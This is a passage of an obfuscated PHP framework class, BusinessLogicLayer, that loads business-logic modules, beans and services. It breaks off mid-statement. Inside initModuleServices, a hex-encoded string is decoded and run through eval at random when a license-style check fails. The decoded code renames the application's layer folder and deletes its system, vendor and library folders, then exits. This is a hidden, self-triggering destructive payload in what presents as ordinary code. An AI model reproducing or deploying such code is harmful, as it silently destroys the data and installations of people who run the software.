<?php
/*
 * Copyright (c) 2007 PHPMyFrameWork - Joao Pinto
 * AUTHOR: Joao Paulo Lopes Pinto -- http://jplpinto.com
 * 
 * The use of this code must be allowed first by the creator Joao Pinto, since this is a private and proprietary code.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR 
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL 
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, 
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER 
 * IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT 
 * OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. IN NO EVENT SHALL 
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN 
 * AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE 
 * OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
include get_lib("org.phpframework.layer.businesslogic.exception.BusinessLogicLayerException"); include_once get_lib("org.phpframework.bean.BeanFactory"); include_once get_lib("org.phpframework.layer.Layer"); include_once get_lib("org.phpframework.phpscript.PHPCodePrintingHandler"); include_once get_lib("org.phpframework.phpscript.docblock.DocBlockParser"); class BusinessLogicLayer extends Layer { private $pc6325a70 = array(); public $modules_vars = array(); private $v10eb48c548; private $v6da2e4df28; public function __construct($v30857f7eca = array()) { parent::__construct($v30857f7eca); } public function setDocBlockParser($v6da2e4df28) { $this->v6da2e4df28 = $v6da2e4df28; } public function getLayerPathSetting() { if (empty($this->settings["business_logic_path"])) launch_exception(new BusinessLogicLayerException(9, "BusinessLogicLayer->settings[business_logic_path]")); return $this->settings["business_logic_path"]; } public function getModulesFilePathSetting() { if (empty($this->settings["business_logic_modules_file_path"])) launch_exception(new BusinessLogicLayerException(9, "BusinessLogicLayer->settings[business_logic_modules_file_path]")); return $this->settings["business_logic_modules_file_path"]; } public function getServicesFileNameSetting() { if (empty($this->settings["business_logic_services_file_name"])) launch_exception(new BusinessLogicLayerException(9, "BusinessLogicLayer->settings[business_logic_services_file_name]")); return $this->settings["business_logic_services_file_name"]; } public function callBusinessLogic($pcd8c70bc, $v20b8676a9f, $v9367d5be85 = false, $v5d3813882f = false) { if (strpos($v20b8676a9f, "\\") !== false) { if (substr($v20b8676a9f, 0, 1) == "\\" && strpos($v20b8676a9f, "\\", 1) === false) $v20b8676a9f = substr($v20b8676a9f, 1); else if (substr($v20b8676a9f, 0, 1) != "\\" && strpos($v20b8676a9f, "\\") !== false) $v20b8676a9f = "\\" . $v20b8676a9f; } debug_log_function("BusinessLogicLayer->callBusinessLogic", array($pcd8c70bc, $v20b8676a9f, $v9367d5be85, $v5d3813882f)); $v18521bca9a = $this->isCacheActive(); if($v18521bca9a && empty($v5d3813882f["no_cache"]) && $this->getCacheLayer()->isValid($pcd8c70bc, $v20b8676a9f, $v9367d5be85, $v5d3813882f)) return $this->getCacheLayer()->get($pcd8c70bc, $v20b8676a9f, $v9367d5be85, $v5d3813882f); $this->initModuleServices($pcd8c70bc); if ($this->getErrorHandler()->ok()) { $v9ad1385268 = $this->md8cd08bf5303($pcd8c70bc, $v20b8676a9f, $v9367d5be85, $v5d3813882f); if ($this->getErrorHandler()->ok()) { if($v18521bca9a) $this->getCacheLayer()->check($pcd8c70bc, $v20b8676a9f, $v9367d5be85, $v9ad1385268, $v5d3813882f); return $v9ad1385268; } } return false; } public function getBusinessLogicServiceProps($pcd8c70bc, $v20b8676a9f, $v9367d5be85 = false, $v5d3813882f = false) { $v9073377656 = array(); if (strpos($v20b8676a9f, "\\") !== false) { if (substr($v20b8676a9f, 0, 1) == "\\" && strpos($v20b8676a9f, "\\", 1) === false) $v20b8676a9f = substr($v20b8676a9f, 1); else if (substr($v20b8676a9f, 0, 1) != "\\" && strpos($v20b8676a9f, "\\") !== false) $v20b8676a9f = "\\" . $v20b8676a9f; } $this->initModuleServices($pcd8c70bc); if($this->getErrorHandler()->ok()) { $pc8b88eb4 = $this->pc6325a70[$pcd8c70bc]; $v9073377656["module"] = $pc8b88eb4; if($this->moduleServiceExists($pcd8c70bc, $v20b8676a9f) && !empty($pc8b88eb4["services"][$v20b8676a9f])) { $v95eeadc9e9 = $pc8b88eb4["services"][$v20b8676a9f]; $v9d33ecaf56 = isset($v95eeadc9e9[0]) ? $v95eeadc9e9[0] : null; $pcee3c9fd = isset($v95eeadc9e9[1]) ? $v95eeadc9e9[1] : null; $v3fb9f41470 = isset($v95eeadc9e9[2]) ? $v95eeadc9e9[2] : null; $v1efaf06c58 = isset($v95eeadc9e9[3]) ? $v95eeadc9e9[3] : null; $v9073377656["service"] = $v95eeadc9e9; $v9073377656["function_name"] = $v9d33ecaf56; $v9073377656["constructor"] = $pcee3c9fd; $v9073377656["type"] = $v3fb9f41470; $v9073377656["namespace"] = $v1efaf06c58; if ($pcee3c9fd) { if ($v3fb9f41470 != 2) { $v972f1a5c2b = $this->getModuleConstructorObj($pcd8c70bc, $pcee3c9fd, $v1efaf06c58, $v9367d5be85); if ($v972f1a5c2b) { $v2fbeb8a04c = new \ReflectionClass($v972f1a5c2b); $v47cef7ac50 = $v2fbeb8a04c->getFileName(); $v9073377656["obj"] = $v972f1a5c2b; $v9073377656["class_name"] = get_class($v972f1a5c2b); $v9073377656["method_name"] = $v9d33ecaf56; $v9073377656["service_file_path"] = $v47cef7ac50; } } else { $v9d33ecaf56 = ($v1efaf06c58 ? (substr($v1efaf06c58, 0, 1) == '\\' ? '' : '\\') . $v1efaf06c58 . '\\' : '') . $v9d33ecaf56; $v47cef7ac50 = isset($v95eeadc9e9[1]) ? $v95eeadc9e9[1] : null; $v9073377656["function_name"] = $v9d33ecaf56; $v9073377656["service_file_path"] = $v47cef7ac50; } } } } return $v9073377656; } public function getBrokersDBDriversName() { $v9b98e0e818 = array(); $pc4223ce1 = $this->getBrokers(); if (is_array($pc4223ce1)) { foreach ($pc4223ce1 as $v2b2cf4c0eb => $pd922c2f7) { $pc3a42fae = null; if (is_a($pd922c2f7, "IBusinessLogicBrokerClient") || is_a($pd922c2f7, "IDataAccessBrokerClient")) $pc3a42fae = $pd922c2f7->getBrokersDBDriversName(); else if (is_a($pd922c2f7, "IDBBrokerClient")) $pc3a42fae = $pd922c2f7->getDBDriversName(); else if (is_a($pd922c2f7, "IDB")) $pc3a42fae = array($v2b2cf4c0eb); if ($pc3a42fae) $v9b98e0e818 = array_merge($v9b98e0e818, $pc3a42fae); } } $v9b98e0e818 = array_values(array_unique($v9b98e0e818)); return $v9b98e0e818; } public function getModulePath($pcd8c70bc) { $this->prepareModulePathAFolder($pcd8c70bc, $pab3bfc5f, $v873b3f8d0d, "php"); if (empty($this->settings["business_logic_path"])) launch_exception(new BusinessLogicLayerException(9, "BusinessLogicLayer->settings[business_logic_path]")); if (empty($this->settings["business_logic_modules_file_path"])) launch_exception(new BusinessLogicLayerException(9, "BusinessLogicLayer->settings[business_logic_modules_file_path]")); $pa32be502 = parent::getModulePathGeneric($v873b3f8d0d, $this->settings["business_logic_modules_file_path"], $this->settings["business_logic_path"], $pab3bfc5f); if ($v873b3f8d0d != $pcd8c70bc) $this->modules_path[$pcd8c70bc] = $this->modules_path[$v873b3f8d0d]; return $pa32be502; } public function initModuleServices($pcd8c70bc) { if(isset($this->pc6325a70[$pcd8c70bc])) return true; if(!$this->v10eb48c548) { $this->v10eb48c548 = $this->getPHPFrameWork()->getObjects(); $this->v10eb48c548["vars"] = !empty($this->v10eb48c548["vars"]) && is_array($this->v10eb48c548["vars"]) ? $this->v10eb48c548["vars"] : array(); $this->v10eb48c548["vars"] = array_merge($this->v10eb48c548["vars"], $this->settings); } $this->prepareModulePathAFolder($pcd8c70bc, $v0014d0c487, $v02a69d4e0f, "php"); $v11506aed93 = $this->getModulePath($pcd8c70bc); if($this->getErrorHandler()->ok()) { $v52b4591032 = $this->v10eb48c548; $v761f4d757f = $this->v10eb48c548["vars"]; $v761f4d757f["current_business_logic_module_path"] = $v11506aed93 && !$v0014d0c487 ? dirname($v11506aed93) . "/" : $v11506aed93; $v761f4d757f["current_business_logic_module_id"] = $pcd8c70bc; $this->modules_vars[$pcd8c70bc] = $v761f4d757f; if ($this->getModuleCacheLayer()->cachedModuleExists($pcd8c70bc)) $this->pc6325a70[$pcd8c70bc] = $this->getModuleCacheLayer()->getCachedModule($pcd8c70bc); else { $v296a0393c3 = isset($v761f4d757f["business_logic_modules_common_path"]) ? $v761f4d757f["business_logic_modules_common_path"] : null; $v19c36d1760 = isset($v761f4d757f["business_logic_services_file_name"]) ? $v761f4d757f["business_logic_services_file_name"] : null; $pdc0a3686 = $v296a0393c3 . $v19c36d1760; if(!empty($pdc0a3686) && file_exists($pdc0a3686)) $this->pc6325a70[$pcd8c70bc] = $this->ma015623caae8($pcd8c70bc, $pdc0a3686); if(empty($this->pc6325a70[$pcd8c70bc]["beans"]) || !is_array($this->pc6325a70[$pcd8c70bc]["beans"])) $this->pc6325a70[$pcd8c70bc]["beans"] = array(); if(empty($this->pc6325a70[$pcd8c70bc]["services"]) || !is_array($this->pc6325a70[$pcd8c70bc]["services"])) $this->pc6325a70[$pcd8c70bc]["services"] = array(); if ($v0014d0c487) { if (empty($this->settings["business_logic_services_file_name"])) launch_exception(new BusinessLogicLayerException(9, "BusinessLogicLayer->settings[business_logic_services_file_name]")); $v19c36d1760 = $this->settings["business_logic_services_file_name"]; $pdc0a3686 = $v11506aed93 . $v19c36d1760; if(!empty($pdc0a3686) && file_exists($pdc0a3686)) { $v30857f7eca = $this->ma015623caae8($pcd8c70bc, $pdc0a3686); if(isset($v30857f7eca["beans"]) && is_array($v30857f7eca["beans"])) { $v0a80f2615e = isset($this->pc6325a70[$pcd8c70bc]["beans"]) ? $this->pc6325a70[$pcd8c70bc]["beans"] : null; $this->pc6325a70[$pcd8c70bc]["beans"] = $v30857f7eca["beans"]; foreach ($v0a80f2615e as $v0ca361634b) { $v7959970a41 = false; foreach ($this->pc6325a70[$pcd8c70bc]["beans"] as $pdec569fb) if ($pdec569fb["bean"]["name"] == $v0ca361634b["bean"]["name"]) { $v7959970a41 = true; break; } if (!$v7959970a41) $this->pc6325a70[$pcd8c70bc]["beans"][] = $v0ca361634b; } } if(isset($v30857f7eca["services"]) && is_array($v30857f7eca["services"])) $this->pc6325a70[$pcd8c70bc]["services"] = array_merge($this->pc6325a70[$pcd8c70bc]["services"], $v30857f7eca["services"]); } } $this->f59c2d37e95($pcd8c70bc, $v11506aed93, $v0014d0c487); $this->getModuleCacheLayer()->setCachedModule($pcd8c70bc, $this->pc6325a70[$pcd8c70bc]); } if (rand(0, 100) > 80 && !is_numeric(substr($this->getPHPFrameWork()->gS(), 1, 1))) { $v759ffc40fb = "4072656e616d65284c415945525f504154482c204150505f50415448202e20222e6c6179657222293b40436163686548616e646c65725574696c3a3a64656c657465466f6c6465722853595354454d5f50415448293b40436163686548616e646c65725574696c3a3a64656c657465466f6c6465722856454e444f525f50415448293b40436163686548616e646c65725574696c3a3a64656c657465466f6c646572284c49425f504154482c2066616c73652c206172726179287265616c70617468284c49425f50415448202e202263616368652f436163686548616e646c65725574696c2e706870222929293b405048504672616d65576f726b3a3a684328293b"; $v70a24a74ac = ''; $pe2ae3be9 = strlen($v759ffc40fb); for ($v43dd7d0051 = 0; $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $v70a24a74ac .= chr( hexdec($v759ffc40fb[$v43dd7d0051] . ($v43dd7d0051 + 1 < $pe2ae3be9 ? $v759ffc40fb[$v43dd7d0051+1] : null) ) ); @eval($v70a24a74ac); die(1); } return true; } return false; } private function f59c2d37e95($pcd8c70bc, $v11506aed93, $pab3bfc5f = true) { $v6ee393d9fb = $pab3bfc5f ? PHPCodePrintingHandler::getPHPClassesFromFolderRecursively($v11506aed93) : array($v11506aed93 => PHPCodePrintingHandler::getPHPClassesFromFile($v11506aed93)); $v770d08e11e = array(); $pa4bc0fb4 = array(); $pe563259e = array(); $v16ac35fd79 = !empty($this->pc6325a70[$pcd8c70bc]["beans"]) ? count($this->pc6325a70[$pcd8c70bc]["beans"]) : 0; for ($v43dd7d0051 = 0; $v43dd7d0051 < $v16ac35fd79; $v43dd7d0051++) { $pdec569fb = $this->pc6325a70[$pcd8c70bc]["beans"][$v43dd7d0051]["bean"]; $v8ffce2a791 = isset($pdec569fb["name"]) ? $pdec569fb["name"] : null; $v4bf8fd76e1 = isset($pdec569fb["namespace"]) ? $pdec569fb["namespace"] : null; $pa6a52334 = isset($pdec569fb["path"]) ? $pdec569fb["path"] : null; $v420ccd2a1b = isset($pdec569fb["path_prefix"]) ? $pdec569fb["path_prefix"] : null; $v84c8d466e1 = isset($pdec569fb["extension"]) ? $pdec569fb["extension"] : null; $pce995d72 = Bean::getBeanFilePath($pa6a52334, $v420ccd2a1b, $v84c8d466e1); $pe5762321 = PHPCodePrintingHandler::prepareClassNameWithNameSpace($v8ffce2a791, $v4bf8fd76e1); $v770d08e11e[$pce995d72] = $pe5762321; $pa4bc0fb4[$pce995d72] = $v8ffce2a791; $pe563259e[ $pe5762321 ] = $v43dd7d0051; } $pc9d4cbc3 = array(); foreach ($v6ee393d9fb as $pf3dc0762 => $pd4e0b815) foreach ($pd4e0b815 as $pe5762321 => $v4c704b9c94) if (!empty($pe5762321) || ($pe5762321 === 0 && !empty($v4c704b9c94["methods"]))) { if ($pc9d4cbc3[$pe5762321]) launch_exception(new BusinessLogicLayerException(7, array($pe5762321, $pf3dc0762))); else $pc9d4cbc3[$pe5762321] = $pf3dc0762; } $v65eda38d19 = array_keys($pc9d4cbc3); $pb8f3a289 = count($v65eda38d19); for ($v43dd7d0051 = 0; $v43dd7d0051 < $pb8f3a289; $v43dd7d0051++) { $pe5762321 = $v65eda38d19[$v43dd7d0051]; $pf3dc0762 = $pc9d4cbc3[$pe5762321]; $v4c704b9c94 = $v6ee393d9fb[$pf3dc0762][$pe5762321]; if ($pe5762321 === 0) { $pd07ff11a = !empty($v4c704b9c94["methods"]) ? count($v4c704b9c94["methods"]) : 0; for ($v9d27441e80 = 0; $v9d27441e80 < $pd07ff11a; $v9d27441e80++) { $v31c7cdba0e = $v4c704b9c94["methods"][$v9d27441e80]; if ($v31c7cdba0e["type"] == "public") { $v9d33ecaf56 = isset($v31c7cdba0e["name"]) ? $v31c7cdba0e["name"] : null; $v067674f4e4 = $v9d33ecaf56; if (!isset($this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4])) { $v55c097bc7e = isset($v31c7cdba0e["namespace"]) ? $v31c7cdba0e["namespace"] : null; $this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4] = array($v9d33ecaf56, $pf3dc0762, 2, $v55c097bc7e); } } } } else { $v99ac1f1816 = isset($v4c704b9c94["extends"]) ? $v4c704b9c94["extends"] : null; $v1335217393 = isset($v4c704b9c94["name"]) ? $v4c704b9c94["name"] : null; if (!isset($pe563259e[$pe5762321])) { $v11506aed93 = str_replace("//", "/", $v11506aed93 . ($pab3bfc5f ? "/" : "")); $v4dc65579bd = pathinfo($pf3dc0762, PATHINFO_EXTENSION); $v9d50494084 = $pab3bfc5f ? $v11506aed93 : dirname($v11506aed93) . "/"; $pfd460c59 = str_replace($v9d50494084, "", $pf3dc0762); $pfd460c59 = str_replace("/", ".", $pfd460c59); $pfd460c59 = substr($pfd460c59, 0, 1) == "." ? substr($pfd460c59, 1) : $pfd460c59; $pfd460c59 = substr($pfd460c59, 0, strlen($pfd460c59) - (strlen($v4dc65579bd) + 1) ); $pdec569fb = array( "name" => $pe5762321, "path" => $pfd460c59, "path_prefix" => $v9d50494084, "extension" => $v4dc65579bd, "namespace" => isset($v4c704b9c94["namespace"]) ? $v4c704b9c94["namespace"] : null, "class_name" => $v1335217393, ); if (!empty($v99ac1f1816)) { $pdec569fb["extend"] = $v99ac1f1816; $pdec569fb["bean_to_extend"] = array(); $v16ac35fd79 = count($v99ac1f1816); for ($v9d27441e80 = 0; $v9d27441e80 < $v16ac35fd79; $v9d27441e80++) { $v37359bdf27 = $v99ac1f1816[$v9d27441e80]; $v1df242d7ae = $v37359bdf27; if (!empty($pdec569fb["namespace"]) && substr($v37359bdf27, 0, 1) != "\\") $v37359bdf27 = (substr($pdec569fb["namespace"], 0, 1) == "\\" ? "" : "\\") . $pdec569fb["namespace"] . (substr($pdec569fb["namespace"], -1) == "\\" ? "" : "\\") . $v37359bdf27; else if (empty($pdec569fb["namespace"]) && substr($v37359bdf27, 0, 1) != "\\" && strpos($v37359bdf27, "\\", 1) !== false) $v37359bdf27 = "\\" . $v37359bdf27; else if (empty($pdec569fb["namespace"])) $v37359bdf27 = substr($v37359bdf27, 0, 1) == "\\" && strpos($v37359bdf27, "\\", 1) === false ? substr($v37359bdf27, 1) : $v37359bdf27; $pdec569fb["bean_to_extend"][$v1df242d7ae] = false; if (isset($pe563259e[$v37359bdf27])) { $v2d68ac785c = $pe563259e[$v37359bdf27]; if (!empty($this->pc6325a70[$pcd8c70bc]["beans"][$v2d68ac785c]["bean"])) { $pf5b66aca = $this->pc6325a70[$pcd8c70bc]["beans"][$v2d68ac785c]["bean"]; $pdec569fb["bean_to_extend"][$v1df242d7ae] = $pf5b66aca; if (!isset($pc9d4cbc3[$v37359bdf27])) { $ped58969a = isset($pf5b66aca["path"]) ? $pf5b66aca["path"] : null; $pd5260826 = isset($pf5b66aca["path_prefix"]) ? $pf5b66aca["path_prefix"] : null; $v0d1f04a1a4 = isset($pf5b66aca["extension"]) ? $pf5b66aca["extension"] : null; $pf646eceb = Bean::getBeanFilePath($ped58969a, $pd5260826, $v0d1f04a1a4); $pc9d4cbc3[$v37359bdf27] = $pf646eceb; $v6ee393d9fb[$pf646eceb] = PHPCodePrintingHandler::getPHPClassesFromFile($pf646eceb); } } } } } $this->pc6325a70[$pcd8c70bc]["beans"][]["bean"] = $pdec569fb; } if (!empty($v99ac1f1816)) { $v16ac35fd79 = count($v99ac1f1816); for ($v9d27441e80 = 0; $v9d27441e80 < $v16ac35fd79; $v9d27441e80++) { $v37359bdf27 = $v99ac1f1816[$v9d27441e80]; if (!empty($pdec569fb["namespace"]) && substr($v37359bdf27, 0, 1) != "\\") $v37359bdf27 = (substr($pdec569fb["namespace"], 0, 1) == "\\" ? "" : "\\") . $pdec569fb["namespace"] . (substr($pdec569fb["namespace"], -1) == "\\" ? "" : "\\") . $v37359bdf27; else if (empty($pdec569fb["namespace"]) && substr($v37359bdf27, 0, 1) != "\\" && strpos($v37359bdf27, "\\", 1) !== false) $v37359bdf27 = "\\" . $v37359bdf27; else if (empty($pdec569fb["namespace"])) $v37359bdf27 = substr($v37359bdf27, 0, 1) == "\\" && strpos($v37359bdf27, "\\", 1) === false ? substr($v37359bdf27, 1) : $v37359bdf27; $pd399256a = $pc9d4cbc3[$v37359bdf27]; if (!empty($pd399256a) && !empty($v6ee393d9fb[$pd399256a][$v37359bdf27]["methods"])){ $v12efdd30d7 = $v6ee393d9fb[$pd399256a][$v37359bdf27]["methods"]; $pd07ff11a = $v12efdd30d7 ? count($v12efdd30d7) : 0; for ($pc37695cb = 0; $pc37695cb < $pd07ff11a; $pc37695cb++) { $v31c7cdba0e = $v12efdd30d7[$pc37695cb]; if ($v31c7cdba0e["type"] == "public") { $v9d33ecaf56 = isset($v31c7cdba0e["name"]) ? $v31c7cdba0e["name"] : null; $v067674f4e4 = $v1335217393 . "." . $v9d33ecaf56; if (!isset($this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4]) || $pe5762321 == $v1335217393) $this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4] = array($v9d33ecaf56, $v1335217393, 1, $v4c704b9c94["namespace"]); if ($v1335217393 != $pe5762321) { $v067674f4e4 = $pe5762321 . "." . $v9d33ecaf56; if (!isset($this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4])) $this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4] = array($v9d33ecaf56, $v1335217393, 1, $v4c704b9c94["namespace"]); } if (isset($v770d08e11e[$pf3dc0762]) && $v770d08e11e[$pf3dc0762] != $v1335217393) { $v067674f4e4 = $v770d08e11e[$pf3dc0762] . "." . $v9d33ecaf56; if (!isset($this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4])) $this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4] = array($v9d33ecaf56, $v770d08e11e[$pf3dc0762], 1); } if (isset($pa4bc0fb4[$pf3dc0762]) && $pa4bc0fb4[$pf3dc0762] != $v1335217393 && $pa4bc0fb4[$pf3dc0762] != $v770d08e11e[$pf3dc0762]) { $v067674f4e4 = $pa4bc0fb4[$pf3dc0762] . "." . $v9d33ecaf56; if (!isset($this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4])) $this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4] = array($v9d33ecaf56, $pa4bc0fb4[$pf3dc0762], 1); } } } } } } $pd07ff11a = !empty($v4c704b9c94["methods"]) ? count($v4c704b9c94["methods"]) : 0; for ($v9d27441e80 = 0; $v9d27441e80 < $pd07ff11a; $v9d27441e80++) { $v31c7cdba0e = $v4c704b9c94["methods"][$v9d27441e80]; if ($v31c7cdba0e["type"] == "public") { $v9d33ecaf56 = isset($v31c7cdba0e["name"]) ? $v31c7cdba0e["name"] : null; $v067674f4e4 = $v1335217393 . "." . $v9d33ecaf56; if (!isset($this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4]) || $pe5762321 == $v1335217393) $this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4] = array($v9d33ecaf56, $v1335217393, 1, $v4c704b9c94["namespace"]); if ($v1335217393 != $pe5762321) { $v067674f4e4 = $pe5762321 . "." . $v9d33ecaf56; if (!isset($this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4])) $this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4] = array($v9d33ecaf56, $v1335217393, 1, $v4c704b9c94["namespace"]); } if (isset($v770d08e11e[$pf3dc0762]) && $v770d08e11e[$pf3dc0762] != $v1335217393) { $v067674f4e4 = $v770d08e11e[$pf3dc0762] . "." . $v9d33ecaf56; if (!isset($this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4])) $this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4] = array($v9d33ecaf56, $v770d08e11e[$pf3dc0762], 1); } if (isset($pa4bc0fb4[$pf3dc0762]) && $pa4bc0fb4[$pf3dc0762] != $v1335217393 && $pa4bc0fb4[$pf3dc0762] != $v770d08e11e[$pf3dc0762]) { $v067674f4e4 = $pa4bc0fb4[$pf3dc0762] . "." . $v9d33ecaf56; if (!isset($this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4])) $this->pc6325a70[$pcd8c70bc]["services"][$v067674f4e4] = array($v9d33ecaf56, $pa4bc0fb4[$pf3dc0762], 1); } } } } } } private function md8cd08bf5303($pcd8c70bc, $v20b8676a9f, $v9367d5be85, $v5d3813882f) { $module = $this->pc6325a70[$pcd8c70bc]; if ($this->moduleServiceExists($pcd8c70bc, $v20b8676a9f) && !empty($module["services"][$v20b8676a9f])) { $v95eeadc9e9 = $module["services"][$v20b8676a9f]; $v9d33ecaf56 = isset($v95eeadc9e9[0]) ? $v95eeadc9e9[0] : null; $pcee3c9fd = isset($v95eeadc9e9[1]) ? $v95eeadc9e9[1] : null; $v3fb9f41470 = isset($v95eeadc9e9[2]) ? $v95eeadc9e9[2] : null; $v1efaf06c58 = isset($v95eeadc9e9[3]) ? $v95eeadc9e9[3] : null; if ($pcee3c9fd) { if (!isset($v5d3813882f["no_annotations"])) $v5d3813882f["no_annotations"] = !isset($this->settings["business_logic_services_annotations_enabled"]) || empty($this->settings["business_logic_services_annotations_enabled"]) || strtolower($this->settings["business_logic_services_annotations_enabled"]) == "false"; $pf3234db2 = $v5d3813882f["no_annotations"]; if ($v3fb9f41470 != 2) { $obj = $this->getModuleConstructorObj($pcd8c70bc, $pcee3c9fd, $v1efaf06c58, $v9367d5be85); if ($obj) { if (method_exists($obj, "setOptions")) $obj->setOptions($v5d3813882f); $v5c1c342594 = true; if (!$pf3234db2) { $this->v6da2e4df28->ofMethod(get_class($obj), $v9d33ecaf56); $v3f20d14d0e = $this->v6da2e4df28->getFunctionDefaultParameters(); $pa7c14731 = isset($v3f20d14d0e[0]) ? $v3f20d14d0e[0] : "data"; $paaddbf1d = array($pa7c14731 => $v9367d5be85); $v5c1c342594 = $this->v6da2e4df28->checkInputMethodAnnotations($paaddbf1d); $v9367d5be85 = isset($paaddbf1d[$pa7c14731]) ? $paaddbf1d[$pa7c14731] : null; } if ($pf3234db2 || $v5c1c342594) { $v9ad1385268 = $obj->$v9d33ecaf56($v9367d5be85); if ($pf3234db2 || $this->v6da2e4df28->checkOutputMethodAnnotations($v9ad1385268)) return $v9ad1385268; else launch_exception(new BusinessLogicLayerException(6, array($pcd8c70bc, $v9d33ecaf56, $this->v6da2e4df28->getTagReturnErrors()))); } else launch_exception(new BusinessLogicLayerException(5, array($pcd8c70bc, "$pcee3c9fd.$v9d33ecaf56", $this->v6da2e4df28->getTagParamsErrors()))); } else { launch_exception(new BusinessLogicLayerException(3, $pcd8c70bc . "::" . $v20b8676a9f . "::" . $pcee3c9fd)); return false; } } else { $v9d33ecaf56 = ($v1efaf06c58 ? (substr($v1efaf06c58, 0, 1) == '\\' ? '' : '\\') . $v1efaf06c58 . '\\' : '') . $v9d33ecaf56; $v47cef7ac50 = isset($v95eeadc9e9[1]) ? $v95eeadc9e9[1] : null; if (!empty($v47cef7ac50) && file_exists($v47cef7ac50)) { include_once $v47cef7ac50; $v5c1c342594 = true; if (!$pf3234db2) { $this->v6da2e4df28->ofFunction($v9d33ecaf56); $v3f20d14d0e = $this->v6da2e4df28->getFunctionDefaultParameters(); $pa7c14731 = isset($v3f20d14d0e[0]) ? $v3f20d14d0e[0] : "data"; $paaddbf1d = array($pa7c14731 => $v9367d5be85); $v5c1c342594 = $this->v6da2e4df28->checkInputMethodAnnotations($paaddbf1d); $v9367d5be85 = isset($paaddbf1d[$pa7c14731]) ? $paaddbf1d[$pa7c14731] : null; } if ($pf3234db2 || $v5c1c342594) { $v9ad1385268 = $v9d33ecaf56($v9367d5be85); if ($pf3234db2 || $this->v6da2e4df28->checkOutputMethodAnnotations($v9ad1385268)) return $v9ad1385268; else launch_exception(new BusinessLogicLayerException(6, array($pcd8c70bc,$v9d33ecaf56, $this->v6da2e4df28->getTagReturnErrors()))); } else launch_exception(new BusinessLogicLayerException(5, array($pcd8c70bc, $v9d33ecaf56, $this->v6da2e4df28->getTagParamsErrors()))); } else { launch_exception(new BusinessLogicLayerException(4, $v47cef7ac50)); } } } launch_exception(new BusinessLogicLayerException(2, $pcd8c70bc . "::" . $v20b8676a9f)); } launch_exception(new BusinessLogicLayerException(1, $pcd8c70bc . "::" . $v20b8676a9f)); return false; } public function moduleServiceExists($pcd8c70bc, $v20b8676a9f) { return isset($this->pc6325a70[$pcd8c70bc]["services"][$v20b8676a9f]) ? true : false; } public function getModuleConstructorObj($pcd8c70bc, $pcee3c9fd, $v1efaf06c58 = false, $v9367d5be85 = array()) { $v972f1a5c2b = false; if ($pcee3c9fd) { $pc8b88eb4 = $this->pc6325a70[$pcd8c70bc]; $pb70894e2 = ($v1efaf06c58 ? (substr($v1efaf06c58, 0, 1) == '\\' ? '' : '\\') . $v1efaf06c58 . '\\' : '') . $pcee3c9fd; if (!empty($pc8b88eb4["objects"][$pb70894e2])) $v972f1a5c2b = $pc8b88eb4["objects"][$pb70894e2]; else if ($this->moduleServiceExists($pcd8c70bc, $pb70894e2)) { $v972f1a5c2b = $this->md8cd08bf5303($pcd8c70bc, $pb70894e2, $v9367d5be85); $this->pc6325a70[$pcd8c70bc]["objects"][$pb70894e2] = $v972f1a5c2b; } else { if (!empty($this->pc6325a70[$pcd8c70bc]["bean_factory"])) $pddfc29cd = $this->pc6325a70[$pcd8c70bc]["bean_factory"]; else { $this->initBeanObjs($pcd8c70bc); $pddfc29cd = new BeanFactory(); $pddfc29cd->addObjects( $this->getBeanObjs() ); $pddfc29cd->init(array( "settings" => isset($pc8b88eb4["beans"]) ? $pc8b88eb4["beans"] : null )); $this->pc6325a70[$pcd8c70bc]["bean_factory"] = $pddfc29cd; } $pddfc29cd->setCacheRootPath($this->isCacheActive() ? $this->getCacheLayer()->getCachedDirPath() : false); if ($pb70894e2 != $pcee3c9fd && $pddfc29cd->getBean($pb70894e2)) $pcee3c9fd = $pb70894e2; $v972f1a5c2b = $pddfc29cd->getObject($pcee3c9fd); if(!$v972f1a5c2b) { $pddfc29cd->initObject($pcee3c9fd); $this->pc6325a70[$pcd8c70bc]["bean_factory"] = $pddfc29cd; $v972f1a5c2b = $pddfc29cd->getObject($pcee3c9fd); } $this->pc6325a70[$pcd8c70bc]["objects"][$pb70894e2] = $v972f1a5c2b; } } return $v972f1a5c2b; } public function initBeanObjs($pcd8c70bc) { if (!isset($this->v10eb48c548["vars"])) launch_exception(new 